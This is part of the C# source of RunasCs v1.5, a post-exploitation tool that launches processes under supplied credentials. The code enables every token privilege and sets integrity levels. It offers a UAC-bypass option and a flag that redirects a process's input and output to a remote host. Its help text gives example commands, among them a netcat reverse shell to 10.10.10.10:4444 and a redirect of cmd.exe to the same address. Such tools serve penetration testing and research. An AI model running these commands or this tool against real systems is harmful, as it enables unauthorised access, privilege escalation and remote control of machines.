    private const int SECURITY_MANDATORY_PROTECTED_PROCESS_RID = 0x5000;
    private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    private static readonly byte[] MANDATORY_LABEL_AUTHORITY = new byte[] { 0, 0, 0, 0, 0, 16 };

    public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
    public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
    public const UInt32 TOKEN_DUPLICATE = 0x0002;
    public const UInt32 TOKEN_IMPERSONATE = 0x0004;
    public const UInt32 TOKEN_QUERY = 0x0008;
    public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
    public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
    public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
    public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
    public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
    public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
        TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
        TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
        TOKEN_ADJUST_SESSIONID);

    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation,uint TokenInformationLength,out uint ReturnLength);
    
    [DllImport("advapi32.dll", SetLastError = true, CharSet=CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool LookupPrivilegeName(string lpSystemName, IntPtr lpLuid, StringBuilder lpName, ref int cchName );

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool AllocateAndInitializeSid(IntPtr pIdentifierAuthority, byte nSubAuthorityCount, int dwSubAuthority0, int dwSubAuthority1, int dwSubAuthority2, int dwSubAuthority3, int dwSubAuthority4, int dwSubAuthority5,  int dwSubAuthority6, int dwSubAuthority7, out IntPtr pSid);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool SetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern IntPtr GetSidSubAuthority(IntPtr sid, UInt32 subAuthorityIndex);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern IntPtr GetSidSubAuthorityCount(IntPtr sid);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool AdjustTokenPrivileges(IntPtr tokenhandle, bool disableprivs, [MarshalAs(UnmanagedType.Struct)] ref TOKEN_PRIVILEGES_2 Newstate, int bufferlength, int PreivousState, int Returnlength);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern int LookupPrivilegeValue(string lpsystemname, string lpname, [MarshalAs(UnmanagedType.Struct)] ref LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError = true, BestFitMapping = false, ThrowOnUnmappableChar = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool LogonUser([MarshalAs(UnmanagedType.LPStr)] string pszUserName, [MarshalAs(UnmanagedType.LPStr)] string pszDomain, [MarshalAs(UnmanagedType.LPStr)] string pszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);
    
    [DllImport("Kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr handle);

    private enum TOKEN_INFORMATION_CLASS
    {
        TokenUser = 1,
        TokenGroups,
        TokenPrivileges,
        TokenOwner,
        TokenPrimaryGroup,
        TokenDefaultDacl,
        TokenSource,
        TokenType,
        TokenImpersonationLevel,
        TokenStatistics,
        TokenRestrictedSids,
        TokenSessionId,
        TokenGroupsAndPrivileges,
        TokenSessionReference,
        TokenSandBoxInert,
        TokenAuditPolicy,
        TokenOrigin,
        TokenElevationType,
        TokenLinkedToken,
        TokenElevation,
        TokenHasRestrictions,
        TokenAccessInformation,
        TokenVirtualizationAllowed,
        TokenVirtualizationEnabled,
        TokenIntegrityLevel,
        TokenUIAccess,
        TokenMandatoryPolicy,
        TokenLogonSid,
        TokenIsAppContainer,
        TokenCapabilities,
        TokenAppContainerSid,
        TokenAppContainerNumber,
        TokenUserClaimAttributes,
        TokenDeviceClaimAttributes,
        TokenRestrictedUserClaimAttributes,
        TokenRestrictedDeviceClaimAttributes,
        TokenDeviceGroups,
        TokenRestrictedDeviceGroups,
        TokenSecurityAttributes,
        TokenIsRestricted,
        TokenProcessTrustLevel,
        TokenPrivateNameSpace,
        TokenSingletonAttributes,
        TokenBnoIsolation,
        TokenChildProcessFlags,
        TokenIsLessPrivilegedAppContainer,
        TokenIsSandboxed,
        TokenIsAppSilo,
        MaxTokenInfoClass
    }

    public enum IntegrityLevel : int
    {
        Same = -2,
        Unknown = -1,
        Untrusted = SECURITY_MANDATORY_UNTRUSTED_RID,
        Low = SECURITY_MANDATORY_LOW_RID,
        Medium = SECURITY_MANDATORY_MEDIUM_RID,
        High = SECURITY_MANDATORY_HIGH_RID,
        System = SECURITY_MANDATORY_SYSTEM_RID,
        ProtectedProcess = SECURITY_MANDATORY_PROTECTED_PROCESS_RID
    }

    private enum TokenGroupAttributes : uint
    {
        Disabled = 0,
        SE_GROUP_MANDATORY = 1,
        SE_GROUP_ENABLED_BY_DEFAULT = 0x2,
        SE_GROUP_ENABLED = 0x4,
        SE_GROUP_OWNER = 0x8,
        SE_GROUP_USE_FOR_DENY_ONLY = 0x10,
        SE_GROUP_INTEGRITY = 0x20,
        SE_GROUP_INTEGRITY_ENABLED = 0x40,
        SE_GROUP_RESOURCE = 0x20000000,
        SE_GROUP_LOGON_ID = 0xC0000000
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_PRIVILEGES_2
    {
        public UInt32 PrivilegeCount;
        public LUID Luid;
        public UInt32 Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SID_IDENTIFIER_AUTHORITY
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
        public byte[] Value;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SID_AND_ATTRIBUTES
    {
        public IntPtr pSID;
        public TokenGroupAttributes Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_MANDATORY_LABEL
    {
        public SID_AND_ATTRIBUTES Label;
    }

    public struct TOKEN_ELEVATION
    {
        public UInt32 TokenIsElevated;
    }

    public struct TOKEN_ELEVATION_TYPE
    {
        public UInt32 TokenElevationType;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public UInt32 LowPart;
        public Int32 HighPart;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public UInt32 Attributes;
    }

    public struct TOKEN_PRIVILEGES
    {
        public int PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 64)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    private static string convertAttributeToString(UInt32 attribute){
        if(attribute == 0)
            return "Disabled";
        if(attribute == 1)
            return "Enabled Default";
        if(attribute == 2)
            return "Enabled";
        if(attribute == 3)
            return "Enabled|Enabled Default";
        return "Error";
    }

    public static List<string[]> GetTokenPrivileges(IntPtr tHandle){
        List<string[]> privileges = new List<string[]>();
        uint TokenInfLength=0;
        bool Result; 
        //Get TokenInformation length in TokenInfLength
        Result = GetTokenInformation(tHandle, TOKEN_INFORMATION_CLASS.TokenPrivileges, IntPtr.Zero, TokenInfLength, out TokenInfLength);
        IntPtr TokenInformation = Marshal.AllocHGlobal((int)TokenInfLength) ;
        Result = GetTokenInformation(tHandle, TOKEN_INFORMATION_CLASS.TokenPrivileges, TokenInformation, TokenInfLength, out TokenInfLength) ; 
        if (Result == false)
            throw new RunasCsException("GetTokenInformation", true);
        TOKEN_PRIVILEGES TokenPrivileges = (TOKEN_PRIVILEGES)Marshal.PtrToStructure( TokenInformation , typeof( TOKEN_PRIVILEGES ) ) ;
        for(int i=0;i<TokenPrivileges.PrivilegeCount;i++){
            StringBuilder sb = new StringBuilder();
            int luidNameLen = 0;
            LUID luid = new LUID();
            string[] privilegeStatus = new string[2];
            luid = TokenPrivileges.Privileges[i].Luid;
            IntPtr ptrLuid = Marshal.AllocHGlobal(Marshal.SizeOf(luid));
            Marshal.StructureToPtr(luid, ptrLuid, true);
            LookupPrivilegeName(null, ptrLuid, null, ref luidNameLen); // call once to get the name len
            sb.EnsureCapacity(luidNameLen + 1);
            Result = LookupPrivilegeName(null, ptrLuid, sb, ref luidNameLen);// call again to get the name
            if (Result == false)
                throw new RunasCsException("LookupPrivilegeName", true);
            privilegeStatus[0]=sb.ToString();
            privilegeStatus[1]=convertAttributeToString(TokenPrivileges.Privileges[i].Attributes);
            privileges.Add(privilegeStatus);
        }
        return privileges;
    }

    public static bool IsFilteredUACToken(IntPtr hToken) {
        bool tokenIsFiltered = false;
        int tokenInfLength = 0;
        // GetTokenInformation(TokenElevation) does not return true in all cases, e.g. when having an High IL token with SeImpersonate privilege
        if (GetTokenIntegrityLevel(hToken) >= IntegrityLevel.High)
            return false;
        GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevation, IntPtr.Zero, tokenInfLength, out tokenInfLength);
        IntPtr tokenElevationPtr = Marshal.AllocHGlobal(tokenInfLength);
        if (!GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevation, tokenElevationPtr, tokenInfLength, out tokenInfLength))
            throw new RunasCsException("GetTokenInformation TokenElevation", true);
        TOKEN_ELEVATION tokenElevation = (TOKEN_ELEVATION)Marshal.PtrToStructure(tokenElevationPtr, typeof(TOKEN_ELEVATION));
        if (tokenElevation.TokenIsElevated > 0) {
            tokenIsFiltered = false;
            Marshal.FreeHGlobal(tokenElevationPtr);
        }
        else {
            tokenInfLength = 0;
            GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevationType, IntPtr.Zero, tokenInfLength, out tokenInfLength);
            IntPtr tokenElevationTypePtr = Marshal.AllocHGlobal(tokenInfLength);
            if (!GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevationType, tokenElevationTypePtr, tokenInfLength, out tokenInfLength))
                throw new RunasCsException("GetTokenInformation TokenElevationType", true);
            TOKEN_ELEVATION_TYPE tokenElevationType = (TOKEN_ELEVATION_TYPE)Marshal.PtrToStructure(tokenElevationTypePtr, typeof(TOKEN_ELEVATION_TYPE));
            if (tokenElevationType.TokenElevationType == 3)  // 3 = TokenElevationTypeLimited
                tokenIsFiltered = true;
            Marshal.FreeHGlobal(tokenElevationTypePtr);
        }
        return tokenIsFiltered;
    }

    // thanks @winlogon0 --> https://github.com/AltF5/MediumToHighIL_Test/blob/main/TestCode2.cs
    public static bool SetTokenIntegrityLevel(IntPtr hToken, IntegrityLevel integrity)
    {
        bool ret = false;
        IntPtr pLabelAuthorityStruct;
        IntPtr pSID;
        IntPtr pLabel;
        int labelSize;
        TOKEN_MANDATORY_LABEL tokenLabel = new TOKEN_MANDATORY_LABEL();
        SID_IDENTIFIER_AUTHORITY authoritySid = new SID_IDENTIFIER_AUTHORITY();
        authoritySid.Value = MANDATORY_LABEL_AUTHORITY;
        pLabelAuthorityStruct = Marshal.AllocHGlobal(Marshal.SizeOf(authoritySid));
        Marshal.StructureToPtr(authoritySid, pLabelAuthorityStruct, false);
        bool result = AllocateAndInitializeSid(pLabelAuthorityStruct, 1, (int)integrity, 0, 0, 0, 0, 0, 0, 0, out pSID);
        tokenLabel.Label.pSID = pSID;
        tokenLabel.Label.Attributes = TokenGroupAttributes.SE_GROUP_INTEGRITY;
        labelSize = Marshal.SizeOf(tokenLabel);
        pLabel = Marshal.AllocHGlobal(labelSize);
        Marshal.StructureToPtr(tokenLabel, pLabel, false);
        result = SetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pLabel, labelSize);
        Marshal.FreeHGlobal(pLabel);
        Marshal.FreeHGlobal(pSID);
        Marshal.FreeHGlobal(pLabelAuthorityStruct);
        if (!result)
            throw new RunasCsException("[!] Failed to set the token's Integrity Level: " + integrity.ToString());
        else
            ret = true;
        return ret;
    }

    public static IntegrityLevel GetTokenIntegrityLevel(IntPtr hToken)
    {
        IntegrityLevel illevel = IntegrityLevel.Unknown;
        IntPtr pb = Marshal.AllocHGlobal(1000);
        uint cb = 1000;
        if (GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pb, cb, out cb))
        {
            IntPtr pSid = Marshal.ReadIntPtr(pb);
            int dwIntegrityLevel = Marshal.ReadInt32(GetSidSubAuthority(pSid, (Marshal.ReadByte(GetSidSubAuthorityCount(pSid)) - 1U)));
            if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID)
            {
                return IntegrityLevel.Low;
            }
            else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
            {
                // Medium Integrity
                return IntegrityLevel.Medium;
            }
            else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID)
            {
                // High Integrity
                return IntegrityLevel.High;
            }
            else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID)
            {
                // System Integrity
                return IntegrityLevel.System;
            }
            return IntegrityLevel.Unknown;
        }
        Marshal.FreeHGlobal(pb);
        return illevel;
    }

    public static string EnablePrivilege(string privilege, IntPtr token)
    {
        string output = "";
        LUID sebLuid = new LUID();
        TOKEN_PRIVILEGES_2 tokenp = new TOKEN_PRIVILEGES_2();
        tokenp.PrivilegeCount = 1;
        LookupPrivilegeValue(null, privilege, ref sebLuid);
        tokenp.Luid = sebLuid;
        tokenp.Attributes = SE_PRIVILEGE_ENABLED;
        if (!AdjustTokenPrivileges(token, false, ref tokenp, 0, 0, 0))
        {
            throw new RunasCsException("AdjustTokenPrivileges on privilege " + privilege, true);
        }
        output += "\r\nAdjustTokenPrivileges on privilege " + privilege + " succeeded";
        return output;
    }

    public static string EnableAllPrivileges(IntPtr token)
    {
        string output = "";
        string[] privileges = { "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeDelegateSessionUserImpersonatePrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege", "SeUndockPrivilege", "SeUnsolicitedInputPrivilege" };
        foreach (string privilege in privileges)
        {
            output += EnablePrivilege(privilege, token);
        }
        return output;
    }

}

public static class RunasCsMainClass
{
    private static readonly string help = @"
RunasCs v1.5 - @splinter_code

Usage:
    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--force-profile] [--bypass-uac] [--remote-impersonation]

Description:
    RunasCs is an utility to run specific processes under a different user account
    by specifying explicit credentials. In contrast to the default runas.exe command
    it supports different logon types and CreateProcess* functions to be used, depending
    on your current permissions. Furthermore it allows input/output redirection (even
    to remote hosts) and you can specify the password directly on the command line.

Positional arguments:
    username                username of the user
    password                password of the user
    cmd                     commandline for the process

Optional arguments:
    -d, --domain domain
                            domain of the user, if in a domain. 
                            Default: """"
    -f, --function create_process_function
                            CreateProcess function to use. When not specified
                            RunasCs determines an appropriate CreateProcess
                            function automatically according to your privileges.
                            0 - CreateProcessAsUserW
                            1 - CreateProcessWithTokenW
                            2 - CreateProcessWithLogonW
    -l, --logon-type logon_type
                            the logon type for the token of the new process.
                            Default: ""2"" - Interactive
    -t, --timeout process_timeout
                            the waiting time (in ms) for the created process.
                            This will halt RunasCs until the spawned process
                            ends and sent the output back to the caller.
                            If you set 0 no output will be retrieved and a 
                            background process will be created.
                            Default: ""120000""
    -r, --remote host:port
                            redirect stdin, stdout and stderr to a remote host.
                            Using this option sets the process_timeout to 0.
    -p, --force-profile
                            force the creation of the user profile on the machine.
                            This will ensure the process will have the
                            environment variables correctly set.
                            WARNING: If non-existent, it creates the user profile
                            directory in the C:\Users folder.
    -b, --bypass-uac     
                            try a UAC bypass to spawn a process without
                            token limitations (not filtered).
    -i, --remote-impersonation     
                            spawn a new process and assign the token of the 
                            logged on user to the main thread.

Examples:
    Run a command as a local user
        RunasCs.exe user1 password1 ""cmd /c whoami /all""
    Run a command as a domain user and logon type as NetworkCleartext (8)
        RunasCs.exe user1 password1 ""cmd /c whoami /all"" -d domain -l 8
    Run a background process as a local user,
        RunasCs.exe user1 password1 ""C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe"" -t 0
    Redirect stdin, stdout and stderr of the specified command to a remote host
        RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444
    Run a command simulating the /netonly flag of runas.exe 
        RunasCs.exe user1 password1 ""cmd /c whoami /all"" -l 9
    Run a command as an Administrator bypassing UAC
        RunasCs.exe adm1 password1 ""cmd /c whoami /priv"" --bypass-uac
    Run a command as an Administrator through remote impersonation
        RunasCs.exe adm1 password1 ""cmd /c echo admin > C:\Windows\admin"" -l 8 --remote-impersonation 
";
    
    // .NETv2 does not allow dict initialization with values. Therefore, we need a function :(
    private static Dictionary<int,string> getLogonTypeDict()
    {
        Dictionary<int,string> logonTypes = new Dictionary<int,string>();
        logonTypes.Add(2, "Interactive");
        logonTypes.Add(3, "Network");
        logonTypes.Add(4, "Batch");
        logonTypes.Add(5, "Service");
        logonTypes.Add(7, "Unlock");
        logonTypes.Add(8, "NetworkCleartext");
        logonTypes.Add(9, "NewCredentials");
        logonTypes.Add(10,"RemoteInteractive");
        logonTypes.Add(11,"CachedInteractive");
        return logonTypes;
    }

    // .NETv2 does not allow dict initialization with values. Therefore, we need a function :(
    private static Dictionary<int,string> getCreateProcessFunctionDict()
    {
        Dictionary<int,string> createProcessFunctions = new Dictionary<int,string>();
        createProcessFunctions.Add(0, "CreateProcessAsUserW");
        createProcessFunctions.Add(1, "CreateProcessWithTokenW");
        createProcessFunctions.Add(2, "CreateProcessWithLogonW");
        return createProcessFunctions;
    }

    private static bool HelpRequired(string param)
    {
        return param == "-h" || param == "--help" || param == "/?";
    }
    
    private static uint ValidateProcessTimeout(string timeout)
    {
        uint processTimeout = 120000;
        try {
            processTimeout = Convert.ToUInt32(timeout);
        }
        catch {
            throw new RunasCsException("Invalid process_timeout value: " + timeout);
        }
        return processTimeout;
    }

    private static string[] ValidateRemote(string remote)
    {
        string[] split = remote.Split(':');
        if( split.Length != 2 ) {
            string error = "Invalid remote value: " + remote + "\r\n";
            error += "[-] Expected format: 'host:port'";
            throw new RunasCsException(error);
        }
        return split;
    }
    
    private static int ValidateLogonType(string type)
    {
        int logonType = 3;
        Dictionary<int,string> logonTypes = getLogonTypeDict();

        try {
            logonType = Convert.ToInt32(type);
            if( !logonTypes.ContainsKey(logonType) ) {
                throw new System.ArgumentException("");
            }
        }
        catch {
            string error = "Invalid logon_type value: " + type + "\r\n";
            error += "[-] Allowed values are:\r\n";
            foreach(KeyValuePair<int,string> item in logonTypes) {
                error += String.Format("[-]     {0}\t{1}\r\n", item.Key, item.Value);
            }
            throw new RunasCsException(error);
        }
        return logonType;
    }
    
    private static int ValidateCreateProcessFunction(string function)
    {
        int createProcessFunction = 2;
        Dictionary<int,string> createProcessFunctions = getCreateProcessFunctionDict();
        try {
            createProcessFunction = Convert.ToInt32(function);
            if( createProcessFunction < 0 || createProcessFunction > 2 ) {
                throw new System.ArgumentException("");
            }
        }
        catch {
            string error = "Invalid createProcess function: " + function + "\r\n";
            error += "[-] Allowed values are:\r\n";
            foreach(KeyValuePair<int,string> item in createProcessFunctions) {
                error += String.Format("[-]     {0}\t{1}\r\n", item.Key, item.Value);
            }
            throw new RunasCsException(error);
        }
        return createProcessFunction;
    }

    private static int DefaultCreateProcessFunction()
    {
        int createProcessFunction = 2;
        IntPtr currentTokenHandle = WindowsIdentity.GetCurrent().Token;        
        List<string[]> privs = new List<string[]>();
        privs = AccessToken.GetTokenPrivileges(currentTokenHandle);
        bool SeAssignPrimaryTokenPrivilegeAssigned = false;
        bool SeImpersonatePrivilegeAssigned = false;
        foreach (string[] s in privs)
        {
            string privilege = s[0];
            if(privilege == "SeAssignPrimaryTokenPrivilege" && AccessToken.GetTokenIntegrityLevel(currentTokenHandle) >= AccessToken.IntegrityLevel.Medium)
                SeAssignPrimaryTokenPrivilegeAssigned = true;
            if(privilege == "SeImpersonatePrivilege" && AccessToken.GetTokenIntegrityLevel(currentTokenHandle) >= AccessToken.IntegrityLevel.High)
                SeImpersonatePrivilegeAssigned = true;
        }
        if (SeAssignPrimaryTokenPrivilegeAssigned)
            createProcessFunction = 0;
        else 
            if (SeImpersonatePrivilegeAssigned)
                createProcessFunction = 1;
        return createProcessFunction;
    }

    public static string RunasCsMain(string[] args)
    {
        if (args.Length == 1 && HelpRequired(args[0]))
        {
            Console.Out.Write(help);
            return "";
        }
        string output = "";
        List<string> positionals = new List<string>();
        string username, password, cmd, domain;
        username = password = cmd = domain = string.Empty;
        string[] remote = null;
        uint processTimeout = 120000;
        int logonType = 2, createProcessFunction = DefaultCreateProcessFunction();
        bool forceUserProfileCreation = false, bypassUac = false, remoteImpersonation = false;
        
        try {
            for(int ctr = 0; ctr < args.Length; ctr++) {
                switch (args[ctr])
                {

                    case "-d":
                    case "--domain":
                        domain = args[++ctr];
                        break;

                    case "-t":
                    case "--timeout":
                        processTimeout = ValidateProcessTimeout(args[++ctr]);
                        break;

                    case "-l":
                    case "--logon-type":
                        logonType = ValidateLogonType(args[++ctr]);
                        break;

                    case "-f":
                    case "--function":
                        createProcessFunction = ValidateCreateProcessFunction(args[++ctr]);
                        break;

                    case "-r":
                    case "--remote":
                        remote = ValidateRemote(args[++ctr]);
                        break;
                    
                    case "-p":
                    case "--force-profile":
                        forceUserProfileCreation = true;
                        break;

                    case "-b":
                    case "--bypass-uac":
                        bypassUac = true;
                        break;

                    case "-i":
                    case "--remote-impersonation":
                        remoteImpersonation = true;
                        break;

                    default:
                        positionals.Add(args[ctr]);
                        break;
                }
            }
        } catch(System.IndexOutOfRangeException) {
            return "[-] Invalid arguments. Use --help for additional help.";
        } catch(RunasCsException e) {
            return String.Format("{0}", e.Message);
        }

        if( positionals.Count < 3 ) {
            return "[-] Not enough arguments. 3 Arguments required. Use --help for additional help.";
        }

        username = positionals[0];
        password = positionals[1];
        cmd = positionals[2];

        if( remote != null ) {
            processTimeout = 0;
        }

        RunasCs invoker = new RunasCs();
        try {
            output = invoker.RunAs(username, password, cmd, domain, processTimeout, logonType, createProcessFunction, remote, forceUserProfileCreation, bypassUac, remoteImpersonation);
        } catch(RunasCsException e) {
            invoker.CleanupHandles();
            output = String.Format("{0}", e.Message);
        }

        return output;
    }
}

class MainClass
{
    static void Main(string[] args)
    {
        Console.Out.Write(RunasCsMainClass.RunasCsMain(args));
        Console.Out.Flush();
    }
}

